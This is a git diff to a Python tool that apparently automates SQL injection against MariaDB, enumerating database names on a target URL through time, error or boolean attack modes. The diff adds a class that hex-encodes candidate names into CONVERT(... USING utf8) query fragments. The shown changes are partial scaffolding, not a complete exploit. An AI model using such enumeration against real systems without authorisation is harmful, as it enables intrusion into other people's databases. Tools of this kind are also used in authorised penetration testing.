@@ -94,7 +94,7 @@ class MariaDBdatabase():
     """ Class that finds the number of databases and names of each database.  """
     def __init__(self, url, header, attack, data=None):
         self.database_num = 0
-        self.database = tuple()
+        self.database_names = []
         self.url = url
         self.header = header
         self.data = data
@@ -134,7 +134,12 @@ class MariaDBdatabase():
         """ Iterates through known characters to find database names. """
         self.char_set = self._search_character_set()
         self.name_generator = NameGenerator(self.char_set)
-        print(self.name_generator.get_name())
+        self.name_query = config.MariaDB.DATABASE_NAME.value
+        self.name = self.name_generator.get_name()
+        self.name_obj = MariaDBString(self.name)
+        self.name_obj.create_name_query()
+        self.name_as_query = self.name_obj.get_name_query()
+        print(self.name_as_query)
 
     def _search_character_set(self):
         """ Enumerates database names for chars used. """
@@ -167,6 +172,26 @@ class MariaDBcolumns():
 class MariaDBrows():
     pass
 
+
+class MariaDBString():
+    """ Class that creates a string of mariaDB functions that will be concat from hex serverside. """
+    def __init__(self, name):
+        # Name as a character list.
+        self.name = name
+        self.function_string = 'CONVERT({} USING utf8), '
+        self.full_name_function = ''
+
+    def create_name_query(self):
+        """ Iterate through name building query string. """
+        for ch in self.name:
+            if(ch != ''):
+                self.function_string_hex = self.function_string.format(hex(ord(ch)))
+                self.full_name_function += self.function_string_hex
+
+    def get_name_query(self):
+        return self.full_name_function
+
+
 class MariaDB():
     """ Main database object for controlling enumeration of mariaDB databases. """
     def __init__(self,url,header,data=None,time=False,error=False,boolean=False):
@@ -191,6 +216,8 @@ class MariaDB():
         if(VERBOSE): print('mariaDB database {} attack initiated ...'.format(self.attack))
         database_names = MariaDBdatabase(self.url,self.header,self.attack, self.data).search_database_names()
 
+
+###### Name Generators ######
 
 class NameGenerator():
     """ Class that creates a generator and returns names lazily. """
